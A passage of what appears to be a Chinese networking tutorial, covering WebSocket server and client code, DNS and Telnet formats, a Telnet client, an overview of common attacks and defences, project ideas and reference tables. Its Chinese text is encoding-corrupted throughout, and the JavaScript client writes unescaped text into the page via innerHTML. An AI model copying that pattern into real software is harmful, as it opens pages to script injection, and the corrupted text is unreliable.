import hashlib
import base64
import struct

class WebSocketServer:
    """ç®€å•çš„WebSocketæœåŠ¡å™¨"""

    GUID = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"

    def __init__(self, host='0.0.0.0', port=8765):
        self.host = host
        self.port = port
        self.server_socket = None

    def start(self):
        """å¯åŠ¨æœåŠ¡å™¨"""
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_socket.bind((self.host, self.port))
        self.server_socket.listen(5)

        print(f"WebSocketæœåŠ¡å™¨è¿è¡Œåœ¨ ws://{self.host}:{self.port}")

        while True:
            client_sock, addr = self.server_socket.accept()
            print(f"æ–°è¿æ¥æ¥è‡ª {addr}")
            self.handle_client(client_sock)

    def handle_client(self, client_sock):
        """å¤„ç†å®¢æˆ·ç«¯è¿æ¥"""
        # æ¥æ”¶HTTPæ¡æ‰‹è¯·æ±‚
        request = client_sock.recv(1024).decode()

        # è§£æSec-WebSocket-Key
        key = None
        for line in request.split('\r\n'):
            if line.startswith('Sec-WebSocket-Key:'):
                key = line.split(': ')[1]
                break

        if not key:
            client_sock.close()
            return

        # è®¡ç®—Sec-WebSocket-Accept
        accept = base64.b64encode(
            hashlib.sha1((key + self.GUID).encode()).digest()
        ).decode()

        # å‘é€æ¡æ‰‹å“åº”
        response = (
            'HTTP/1.1 101 Switching Protocols\r\n'
            'Upgrade: websocket\r\n'
            'Connection: Upgrade\r\n'
            f'Sec-WebSocket-Accept: {accept}\r\n'
            '\r\n'
        )
        client_sock.send(response.encode())

        print("WebSocketæ¡æ‰‹å®Œæˆ")

        # å¤„ç†WebSocketå¸§
        try:
            while True:
                frame = self.receive_frame(client_sock)
                if frame is None:
                    break

                opcode, payload = frame

                if opcode == 0x1:  # æ–‡æœ¬å¸§
                    print(f"æ¥æ”¶åˆ°æ–‡æœ¬: {payload.decode('utf-8')}")
                    # å›æ˜¾æ¶ˆæ¯
                    self.send_frame(client_sock, 0x1, payload)
                elif opcode == 0x8:  # å…³é—­å¸§
                    print("å®¢æˆ·ç«¯è¯·æ±‚å…³é—­è¿æ¥")
                    break
                elif opcode == 0x9:  # Ping
                    # å“åº”Pong
                    self.send_frame(client_sock, 0xA, payload)

        except Exception as e:
            print(f"é”™è¯¯: {e}")
        finally:
            client_sock.close()
            print("è¿æ¥å·²å…³é—­")

    def receive_frame(self, sock):
        """æ¥æ”¶WebSocketå¸§"""
        try:
            # è¯»å–å‰2å­—èŠ‚
            header = sock.recv(2)
            if len(header) < 2:
                return None

            byte1, byte2 = header[0], header[1]

            # è§£æå¤´éƒ¨
            fin = (byte1 >> 7) & 1
            opcode = byte1 & 0x0F
            mask = (byte2 >> 7) & 1
            payload_len = byte2 & 0x7F

            # è¯»å–æ‰©å±•é•¿åº¦
            if payload_len == 126:
                extended_len = sock.recv(2)
                payload_len = struct.unpack('!H', extended_len)[0]
            elif payload_len == 127:
                extended_len = sock.recv(8)
                payload_len = struct.unpack('!Q', extended_len)[0]

            # è¯»å–æ©ç 
            if mask:
                masking_key = sock.recv(4)
            else:
                masking_key = None

            # è¯»å–è´Ÿè½½
            payload = sock.recv(payload_len)

            # è§£é™¤æ©ç 
            if mask and masking_key:
                payload = bytes([payload[i] ^ masking_key[i % 4]
                                for i in range(len(payload))])

            return (opcode, payload)

        except Exception as e:
            print(f"æ¥æ”¶å¸§é”™è¯¯: {e}")
            return None

    def send_frame(self, sock, opcode, payload):
        """å‘é€WebSocketå¸§"""
        frame = bytearray()

        # ç¬¬ä¸€å­—èŠ‚: FIN=1, opcode
        frame.append(0x80 | opcode)

        # ç¬¬äºŒå­—èŠ‚: MASK=0, payload length
        payload_len = len(payload)
        if payload_len <= 125:
            frame.append(payload_len)
        elif payload_len <= 65535:
            frame.append(126)
            frame.extend(struct.pack('!H', payload_len))
        else:
            frame.append(127)
            frame.extend(struct.pack('!Q', payload_len))

        # è´Ÿè½½æ•°æ®
        frame.extend(payload)

        sock.send(frame)

# ä½¿ç”¨ç¤ºä¾‹
if __name__ == "__main__":
    server = WebSocketServer()
    server.start()
```

**WebSocketå®¢æˆ·ç«¯ç¤ºä¾‹ï¼ˆJavaScriptï¼‰**:

```html
<!DOCTYPE html>
<html>
<head>
    <title>WebSocket Client</title>
</head>
<body>
    <h1>WebSocketå®¢æˆ·ç«¯</h1>
    <input type="text" id="message" placeholder="è¾“å…¥æ¶ˆæ¯">
    <button onclick="sendMessage()">å‘é€</button>
    <div id="output"></div>

    <script>
        // è¿æ¥WebSocketæœåŠ¡å™¨
        const ws = new WebSocket('ws://localhost:8765');

        ws.onopen = function() {
            console.log('WebSocketè¿æ¥å·²å»ºç«‹');
            document.getElementById('output').innerHTML += '<p>å·²è¿æ¥åˆ°æœåŠ¡å™¨</p>';
        };

        ws.onmessage = function(event) {
            console.log('æ”¶åˆ°æ¶ˆæ¯:', event.data);
            document.getElementById('output').innerHTML +=
                '<p>æœåŠ¡å™¨: ' + event.data + '</p>';
        };

        ws.onclose = function() {
            console.log('WebSocketè¿æ¥å·²å…³é—­');
            document.getElementById('output').innerHTML += '<p>è¿æ¥å·²å…³é—­</p>';
        };

        ws.onerror = function(error) {
            console.error('WebSocketé”™è¯¯:', error);
        };

        function sendMessage() {
            const message = document.getElementById('message').value;
            ws.send(message);
            document.getElementById('output').innerHTML +=
                '<p>æˆ‘: ' + message + '</p>';
            document.getElementById('message').value = '';
        }
    </script>
</body>
</html>
```

### 6.3 DNS åè®®æ·±åº¦è§£æ

#### DNSæŸ¥è¯¢è¿‡ç¨‹

```
1. æµè§ˆå™¨ç¼“å­˜
   â†“ (æœªæ‰¾åˆ°)
2. æ“ä½œç³»ç»Ÿç¼“å­˜ (/etc/hosts)
   â†“ (æœªæ‰¾åˆ°)
3. æœ¬åœ°DNSæœåŠ¡å™¨ (ISPæä¾›)
   â†“ (æœªæ‰¾åˆ°ï¼Œå¼€å§‹é€’å½’æŸ¥è¯¢)
4. æ ¹åŸŸåæœåŠ¡å™¨ (.)
   â†“ (è¿”å›é¡¶çº§åŸŸåæœåŠ¡å™¨åœ°å€)
5. é¡¶çº§åŸŸåæœåŠ¡å™¨ (.com)
   â†“ (è¿”å›æƒå¨åŸŸåæœåŠ¡å™¨åœ°å€)
6. æƒå¨åŸŸåæœåŠ¡å™¨ (example.com)
   â†“ (è¿”å›IPåœ°å€)
7. è¿”å›ç»™å®¢æˆ·ç«¯å¹¶ç¼“å­˜
```

#### DNSæŠ¥æ–‡æ ¼å¼

```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                      Transaction ID                           â”‚
â”œâ”€â”¬â”€â”¬â”€â”¬â”€â”¬â”€â”¬â”€â”¬â”€â”¬â”€â”¬â”€â”¬â”€â”¬â”€â”¬â”€â”¬â”€â”¬â”€â”¬â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚QRâ”‚ Opcode  â”‚AAâ”‚TCâ”‚RDâ”‚RAâ”‚Zâ”‚ADâ”‚CDâ”‚      Response Code        â”‚
â”œâ”€â”´â”€â”´â”€â”´â”€â”´â”€â”´â”€â”´â”€â”´â”€â”´â”€â”´â”€â”´â”€â”´â”€â”´â”€â”´â”€â”´â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                    Question Count                             â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                    Answer Count                               â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                   Authority Count                             â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                  Additional Count                             â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                      Questions                                â”‚
â”‚                      ...                                      â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                      Answers                                  â”‚
â”‚                      ...                                      â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                    Authority Records                          â”‚
â”‚                      ...                                      â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                   Additional Records                          â”‚
â”‚                      ...                                      â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

**æ ‡å¿—ä½è¯´æ˜**:

- **QR**: 0=æŸ¥è¯¢ï¼Œ1=å“åº”
- **Opcode**: æ“ä½œç ï¼ˆ0=æ ‡å‡†æŸ¥è¯¢ï¼Œ1=åå‘æŸ¥è¯¢ï¼‰
- **AA**: æƒå¨åº”ç­”
- **TC**: æˆªæ–­æ ‡å¿—
- **RD**: æœŸæœ›é€’å½’
- **RA**: å¯ç”¨é€’å½’
- **Z**: ä¿ç•™
- **AD**: å·²è®¤è¯æ•°æ®
- **CD**: æ£€æŸ¥ç¦ç”¨
- **Rcode**: å“åº”ç ï¼ˆ0=æ— é”™è¯¯ï¼Œ3=åŸŸåä¸å­˜åœ¨ï¼‰

#### DNSè®°å½•ç±»å‹è¯¦è§£

| ç±»å‹ | å€¼ | æè¿° | ç¤ºä¾‹ |
|------|---|------|------|
| **A** | 1 | IPv4åœ°å€ | example.com -> 93.184.216.34 |
| **AAAA** | 28 | IPv6åœ°å€ | example.com -> 2606:2800:220:1:248:1893:25c8:1946 |
| **CNAME** | 5 | åˆ«å | www.example.com -> example.com |
| **MX** | 15 | é‚®ä»¶æœåŠ¡å™¨ | example.com -> mail.example.com (ä¼˜å…ˆçº§10) |
| **NS** | 2 | åŸŸåæœåŠ¡å™¨ | example.com -> ns1.example.com |
| **TXT** | 16 | æ–‡æœ¬è®°å½• | example.com -> "v=spf1 include:_spf.google.com ~all" |
| **PTR** | 12 | åå‘è§£æ | 34.216.184.93.in-addr.arpa -> example.com |
| **SOA** | 6 | æˆæƒèµ·å§‹ | åŒ…å«åŸŸçš„ä¸»è¦ä¿¡æ¯ |
| **SRV** | 33 | æœåŠ¡è®°å½• | _http._tcp.example.com -> server.example.com:80 |

### 6.4 Telnet åè®®

#### Telnetç‰¹ç‚¹

- **è¿œç¨‹ç™»å½•åè®®**: å…è®¸ç”¨æˆ·è¿œç¨‹è®¿é—®ä¸»æœº
- **æ˜æ–‡ä¼ è¾“**: ä¸åŠ å¯†ï¼Œå­˜åœ¨å®‰å…¨é£é™©
- **é»˜è®¤ç«¯å£**: 23
- **å·²è¢«SSHå–ä»£**: SSHæä¾›åŠ å¯†é€šä¿¡

#### Telnetåè®®æ ¼å¼

**Telnetå‘½ä»¤æ ¼å¼**:
```
IAC + Command + Option

IAC (Interpret As Command): 0xFF (255)
```

**å¸¸ç”¨å‘½ä»¤**:
```
SE   (240): å­é€‰é¡¹ç»“æŸ
NOP  (241): æ— æ“ä½œ
DM   (242): æ•°æ®æ ‡è®°
BRK  (243): ä¸­æ–­
IP   (244): ä¸­æ–­è¿›ç¨‹
AO   (245): ä¸­æ­¢è¾“å‡º
AYT  (246): ä½ åœ¨å—ï¼Ÿ
EC   (247): è½¬ä¹‰å­—ç¬¦
EL   (248): åˆ é™¤è¡Œ
GA   (249): ç»§ç»­
SB   (250): å­é€‰é¡¹å¼€å§‹
WILL (251): å°†è¦ä½¿ç”¨æŸé€‰é¡¹
WONT (252): ä¸ä¼šä½¿ç”¨æŸé€‰é¡¹
DO   (253): è¯·æ±‚å¯¹æ–¹ä½¿ç”¨æŸé€‰é¡¹
DONT (254): è¯·æ±‚å¯¹æ–¹ä¸ä½¿ç”¨æŸé€‰é¡¹
IAC  (255): å‘½ä»¤å¼€å§‹
```

**å®æˆ˜ç¤ºä¾‹ï¼šç®€å•Telnetå®¢æˆ·ç«¯**

```python
import socket
import sys

class TelnetClient:
    """ç®€å•çš„Telnetå®¢æˆ·ç«¯"""

    def __init__(self, host, port=23):
        self.host = host
        self.port = port
        self.sock = None

    def connect(self):
        """è¿æ¥åˆ°TelnetæœåŠ¡å™¨"""
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.connect((self.host, self.port))
            print(f"å·²è¿æ¥åˆ° {self.host}:{self.port}")
            return True
        except Exception as e:
            print(f"è¿æ¥å¤±è´¥: {e}")
            return False

    def send_command(self, command):
        """å‘é€å‘½ä»¤"""
        if not self.sock:
            print("æœªè¿æ¥åˆ°æœåŠ¡å™¨")
            return

        # å‘é€å‘½ä»¤
        self.sock.sendall(command.encode() + b'\r\n')

    def receive_data(self, timeout=1):
        """æ¥æ”¶æ•°æ®"""
        if not self.sock:
            return None

        self.sock.settimeout(timeout)
        try:
            data = self.sock.recv(4096)
            return data.decode('utf-8', errors='ignore')
        except socket.timeout:
            return None

    def close(self):
        """å…³é—­è¿æ¥"""
        if self.sock:
            self.sock.close()
            print("è¿æ¥å·²å…³é—­")

# ä½¿ç”¨ç¤ºä¾‹
if __name__ == "__main__":
    client = TelnetClient('localhost', 23)
    if client.connect():
        # æ¥æ”¶æ¬¢è¿æ¶ˆæ¯
        welcome = client.receive_data()
        if welcome:
            print(welcome)

        # å‘é€å‘½ä»¤
        client.send_command('ls')
        response = client.receive_data()
        if response:
            print(response)

        client.close()
```

---

## ç¬¬ä¸ƒç« ï¼šç‰©è”ç½‘(IoT)åè®®

> **æ³¨æ„**: IoTåè®®éƒ¨åˆ†ï¼ˆMQTTã€CoAPã€CANã€Bluetoothï¼‰çš„è¯¦ç»†å†…å®¹å·²æ‹†åˆ†åˆ°ç‹¬ç«‹æ–‡ä»¶ä¸­ã€‚
>
> è¯¦è§: `protocol_iot.md`

### IoTåè®®æ¦‚è§ˆ

| åè®® | ä¼ è¾“å±‚ | ç‰¹ç‚¹ | åº”ç”¨åœºæ™¯ |
|------|--------|------|---------|
| **MQTT** | TCP | å‘å¸ƒ/è®¢é˜…ã€è½»é‡çº§ | æ™ºèƒ½å®¶å±…ã€ä¼ æ„Ÿå™¨ç½‘ç»œ |
| **CoAP** | UDP | RESTfulã€ä½åŠŸè€— | å—é™è®¾å¤‡ã€M2Mé€šä¿¡ |
| **CAN** | ç‰©ç†å±‚ | å®æ—¶æ€§ã€å¯é æ€§ | æ±½è½¦ã€å·¥ä¸šæ§åˆ¶ |
| **Bluetooth** | æ— çº¿ | çŸ­è·ç¦»ã€ä½åŠŸè€— | å¯ç©¿æˆ´è®¾å¤‡ã€è¿‘åœºé€šä¿¡ |

æ›´å¤šè¯¦ç»†å†…å®¹è¯·å‚è€ƒ: [IoTåè®®è¯¦è§£](protocol_iot.md)

---

## ç¬¬å…«ç« ï¼šåè®®å®‰å…¨ä¸ä¼˜åŒ–

### 8.1 åè®®å®‰å…¨å¨èƒ

#### å¸¸è§å®‰å…¨å¨èƒ

**1. ä¸­é—´äººæ”»å‡» (MITM)**
```
æ”»å‡»è€…æ‹¦æˆªå¹¶å¯èƒ½ä¿®æ”¹é€šä¿¡æ•°æ®

é˜²å¾¡æªæ–½:
- ä½¿ç”¨TLS/SSLåŠ å¯†
- è¯ä¹¦éªŒè¯
- HTTPSå¼ºåˆ¶
```

**2. DDoSæ”»å‡»**
```
åˆ†å¸ƒå¼æ‹’ç»æœåŠ¡æ”»å‡»

ç±»å‹:
- SYN Flood
- UDP Flood
- HTTP Flood

é˜²å¾¡:
- é™æµ
- é˜²ç«å¢™
- CDN
```

**3. DNSåŠ«æŒ**
```
ç¯¡æ”¹DNSè§£æç»“æœ

é˜²å¾¡:
- DNSSEC
- DNS over HTTPS (DoH)
- DNS over TLS (DoT)
```

### 8.2 åè®®ä¼˜åŒ–æŠ€æœ¯

**1. è¿æ¥å¤ç”¨**
```
HTTP/2: å¤šè·¯å¤ç”¨
å‡å°‘TCPæ¡æ‰‹å¼€é”€
```

**2. æ•°æ®å‹ç¼©**
```
gzip, brotliå‹ç¼©
å‡å°‘ä¼ è¾“æ•°æ®é‡
```

**3. ç¼“å­˜ç­–ç•¥**
```
CDNç¼“å­˜
æµè§ˆå™¨ç¼“å­˜
åº”ç”¨å±‚ç¼“å­˜
```

---

## ç¬¬ä¹ç« ï¼šå­¦ä¹ éªŒè¯ä¸å®æˆ˜é¡¹ç›®

### 9.1 å­¦ä¹ æ•ˆæœéªŒè¯æ ‡å‡†

#### åŸºç¡€çŸ¥è¯†éªŒè¯ (å¿…é¡»æŒæ¡)

- [ ] èƒ½å¤Ÿè§£é‡Šç½‘ç»œåè®®çš„ä¸‰è¦ç´ ï¼ˆè¯­æ³•ã€è¯­ä¹‰ã€æ—¶åºï¼‰
- [ ] ç†è§£OSIä¸ƒå±‚æ¨¡å‹å’ŒTCP/IPå››å±‚æ¨¡å‹çš„åŒºåˆ«
- [ ] æŒæ¡TCPä¸‰æ¬¡æ¡æ‰‹å’Œå››æ¬¡æŒ¥æ‰‹çš„å®Œæ•´æµç¨‹
- [ ] äº†è§£UDPä¸TCPçš„æœ¬è´¨åŒºåˆ«åŠåº”ç”¨åœºæ™¯
- [ ] èƒ½å¤Ÿåˆ†æä»¥å¤ªç½‘å¸§ã€IPæ•°æ®åŒ…ã€TCPæ®µçš„ç»“æ„
- [ ] ç†è§£ARPåè®®çš„å·¥ä½œåŸç†
- [ ] æŒæ¡ICMPåè®®åŠpingã€tracerouteçš„å®ç°åŸç†
- [ ] äº†è§£HTTP/HTTPSçš„å·¥ä½œæµç¨‹
- [ ] ç†è§£DNSåŸŸåè§£æçš„å®Œæ•´è¿‡ç¨‹
- [ ] æŒæ¡WebSocketçš„æ¡æ‰‹å’Œæ•°æ®å¸§æ ¼å¼

#### å®è·µèƒ½åŠ›éªŒè¯ (æ ¸å¿ƒèƒ½åŠ›)

- [ ] èƒ½å¤Ÿä½¿ç”¨Pythonå®ç°TCPå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨
- [ ] èƒ½å¤Ÿä½¿ç”¨Pythonå®ç°UDPé€šä¿¡
- [ ] èƒ½å¤Ÿæ„é€ å’Œè§£æIPæ•°æ®åŒ…
- [ ] èƒ½å¤Ÿå®ç°ç®€å•çš„pingç¨‹åº
- [ ] èƒ½å¤Ÿå®ç°HTTPå®¢æˆ·ç«¯
- [ ] èƒ½å¤Ÿä½¿ç”¨Wiresharkè¿›è¡Œåè®®åˆ†æ
- [ ] èƒ½å¤Ÿè¯Šæ–­å¸¸è§çš„ç½‘ç»œè¿æ¥é—®é¢˜
- [ ] èƒ½å¤Ÿç¼–å†™ç®€å•çš„åè®®è§£æå™¨
- [ ] èƒ½å¤Ÿè®¾è®¡å’Œå®ç°è‡ªå®šä¹‰åº”ç”¨å±‚åè®®

#### è¿›é˜¶èƒ½åŠ›éªŒè¯ (åŠ åˆ†é¡¹)

- [ ] èƒ½å¤Ÿå®ç°WebSocketæœåŠ¡å™¨
- [ ] ç†è§£å¹¶å®ç°åè®®åŠ å¯†ï¼ˆTLSæ¡æ‰‹ï¼‰
- [ ] èƒ½å¤Ÿè¿›è¡Œç½‘ç»œæ€§èƒ½ä¼˜åŒ–
- [ ] äº†è§£å¹¶èƒ½é˜²èŒƒå¸¸è§ç½‘ç»œæ”»å‡»ï¼ˆSYN Floodã€ARPæ¬ºéª—ï¼‰
- [ ] èƒ½å¤Ÿå®ç°MQTTæˆ–CoAPå®¢æˆ·ç«¯
- [ ] ç†è§£HTTP/2å’ŒHTTP/3çš„æ”¹è¿›
- [ ] èƒ½å¤Ÿè¿›è¡Œåè®®æ¨¡ç³Šæµ‹è¯•

### 9.2 å®æˆ˜é¡¹ç›®å»ºè®®

#### åˆçº§é¡¹ç›®

**1. ç®€å•HTTPæœåŠ¡å™¨**
```
åŠŸèƒ½:
- å¤„ç†GET/POSTè¯·æ±‚
- é™æ€æ–‡ä»¶æœåŠ¡
- åŸºæœ¬çš„è·¯ç”±åŠŸèƒ½

æŠ€æœ¯æ ˆ: Python socket
å­¦ä¹ ç›®æ ‡: æ·±å…¥ç†è§£HTTPåè®®
```

**2. èŠå¤©å®¤ç¨‹åº**
```
åŠŸèƒ½:
- TCPå¤šå®¢æˆ·ç«¯èŠå¤©
- ç”¨æˆ·ç™»å½•/é€€å‡º
- æ¶ˆæ¯å¹¿æ’­

æŠ€æœ¯æ ˆ: Python socket + threading
å­¦ä¹ ç›®æ ‡: ç†è§£TCPè¿æ¥ç®¡ç†
```

**3. DNSå®¢æˆ·ç«¯**
```
åŠŸèƒ½:
- æ„é€ DNSæŸ¥è¯¢
- è§£æDNSå“åº”
- æ”¯æŒå¤šç§è®°å½•ç±»å‹

æŠ€æœ¯æ ˆ: Python socket + struct
å­¦ä¹ ç›®æ ‡: ç†è§£DNSåè®®æ ¼å¼
```

#### ä¸­çº§é¡¹ç›®

**1. HTTPä»£ç†æœåŠ¡å™¨**
```
åŠŸèƒ½:
- è½¬å‘HTTPè¯·æ±‚
- ç¼“å­˜åŠŸèƒ½
- è®¿é—®æ§åˆ¶

æŠ€æœ¯æ ˆ: Python
å­¦ä¹ ç›®æ ‡: ç†è§£HTTPä»£ç†åŸç†
```

**2. ç½‘ç»œåè®®åˆ†æå·¥å…·**
```
åŠŸèƒ½:
- æŠ“åŒ…
- åè®®è§£æ
- æµé‡ç»Ÿè®¡

æŠ€æœ¯æ ˆ: Python scapy
å­¦ä¹ ç›®æ ‡: æ·±å…¥ç†è§£åè®®ç»“æ„
```

**3. WebSocketå®æ—¶åº”ç”¨**
```
åŠŸèƒ½:
- WebSocketæœåŠ¡å™¨
- å®æ—¶æ•°æ®æ¨é€
- å¤šæˆ¿é—´èŠå¤©

æŠ€æœ¯æ ˆ: Python/Node.js
å­¦ä¹ ç›®æ ‡: ç†è§£å…¨åŒå·¥é€šä¿¡
```

#### é«˜çº§é¡¹ç›®

**1. åˆ†å¸ƒå¼çˆ¬è™«ç³»ç»Ÿ**
```
åŠŸèƒ½:
- å¤šèŠ‚ç‚¹çˆ¬å–
- ä»»åŠ¡åˆ†å‘
- ç»“æœèšåˆ

æŠ€æœ¯æ ˆ: Python + Redis + MQTT
å­¦ä¹ ç›®æ ‡: ç†è§£åˆ†å¸ƒå¼é€šä¿¡
```

**2. IoTæ•°æ®é‡‡é›†å¹³å°**
```
åŠŸèƒ½:
- MQTTæ¶ˆæ¯è®¢é˜…
- æ•°æ®å­˜å‚¨
- å®æ—¶ç›‘æ§

æŠ€æœ¯æ ˆ: MQTT + WebSocket + Database
å­¦ä¹ ç›®æ ‡: ç†è§£IoTåè®®åº”ç”¨
```

**3. ç½‘ç»œå®‰å…¨å·¥å…·**
```
åŠŸèƒ½:
- ç«¯å£æ‰«æ
- åè®®è¯†åˆ«
- æ¼æ´æ£€æµ‹

æŠ€æœ¯æ ˆ: Python scapy + nmap
å­¦ä¹ ç›®æ ‡: ç†è§£ç½‘ç»œå®‰å…¨
```

---

## é™„å½•

### A. å­¦ä¹ èµ„æºæ¨è

**ç»å…¸ä¹¦ç±**:
- ã€ŠTCP/IPè¯¦è§£ å·1: åè®®ã€‹ - W. Richard Stevensï¼ˆå¿…è¯»ï¼‰
- ã€Šè®¡ç®—æœºç½‘ç»œã€‹ï¼ˆç¬¬7ç‰ˆï¼‰ - Andrew S. Tanenbaum
- ã€ŠHTTPæƒå¨æŒ‡å—ã€‹ - David Gourley
- ã€Šå›¾è§£TCP/IPã€‹ - ç«¹ä¸‹éš†å²
- ã€Šç½‘ç»œåè®®åˆ†æä¸è®¾è®¡ã€‹ - æå–„ä»“

**åœ¨çº¿èµ„æº**:
- RFCæ–‡æ¡£åº“: https://www.rfc-editor.org/
- Wiresharkå®˜æ–¹æ•™ç¨‹: https://www.wireshark.org/docs/
- Python Socketç¼–ç¨‹: https://docs.python.org/3/library/socket.html
- Mozilla HTTPæ–‡æ¡£: https://developer.mozilla.org/en-US/docs/Web/HTTP
- CloudFlare Learning: https://www.cloudflare.com/learning/

**å·¥å…·æ¨è**:
- **Wireshark**: ç½‘ç»œåè®®åˆ†æå™¨ï¼ˆå¿…å¤‡ï¼‰
- **tcpdump**: å‘½ä»¤è¡ŒæŠ“åŒ…å·¥å…·
- **nmap**: ç½‘ç»œæ‰«æå·¥å…·
- **Postman**: APIæµ‹è¯•å·¥å…·
- **curl**: å‘½ä»¤è¡ŒHTTPå®¢æˆ·ç«¯
- **netcat**: ç½‘ç»œç‘å£«å†›åˆ€
- **scapy**: Pythonç½‘ç»œåè®®åº“

### B. å¸¸è§åè®®é€ŸæŸ¥è¡¨

| åè®® | å±‚æ¬¡ | ç«¯å£ | ä¼ è¾“åè®® | ç”¨é€” |
|------|------|------|---------|------|
| HTTP | åº”ç”¨å±‚ | 80 | TCP | Webè®¿é—® |
| HTTPS | åº”ç”¨å±‚ | 443 | TCP | å®‰å…¨Webè®¿é—® |
| FTP | åº”ç”¨å±‚ | 20/21 | TCP | æ–‡ä»¶ä¼ è¾“ |
| SSH | åº”ç”¨å±‚ | 22 | TCP | è¿œç¨‹ç™»å½• |
| Telnet | åº”ç”¨å±‚ | 23 | TCP | è¿œç¨‹ç»ˆç«¯ |
| SMTP | åº”ç”¨å±‚ | 25 | TCP | é‚®ä»¶å‘é€ |
| DNS | åº”ç”¨å±‚ | 53 | UDP/TCP | åŸŸåè§£æ |
| DHCP | åº”ç”¨å±‚ | 67/68 | UDP | åŠ¨æ€IPåˆ†é… |
| TFTP | åº”ç”¨å±‚ | 69 | UDP | ç®€å•æ–‡ä»¶ä¼ è¾“ |
| POP3 | åº”ç”¨å±‚ | 110 | TCP | é‚®ä»¶æ¥æ”¶ |
| NTP | åº”ç”¨å±‚ | 123 | UDP | æ—¶é—´åŒæ­¥ |
| IMAP | åº”ç”¨å±‚ | 143 | TCP | é‚®ä»¶è®¿é—® |
| SNMP | åº”ç”¨å±‚ | 161/162 | UDP | ç½‘ç»œç®¡ç† |
| LDAP | åº”ç”¨å±‚ | 389 | TCP | ç›®å½•è®¿é—® |
| HTTPS | åº”ç”¨å±‚ | 443 | TCP | å®‰å…¨HTTP |
| SMB | åº”ç”¨å±‚ | 445 | TCP | æ–‡ä»¶å…±äº« |
| MQTT | åº”ç”¨å±‚ | 1883 | TCP | IoTæ¶ˆæ¯ |
| MySQL | åº”ç”¨å±‚ | 3306 | TCP | æ•°æ®åº“ |
| RDP | åº”ç”¨å±‚ | 3389 | TCP | è¿œç¨‹æ¡Œé¢ |
| Redis | åº”ç”¨å±‚ | 6379 | TCP | ç¼“å­˜ |
| WebSocket | åº”ç”¨å±‚ | 80/443 | TCP | åŒå‘é€šä¿¡ |

### C. å¸¸ç”¨å‘½ä»¤é€ŸæŸ¥

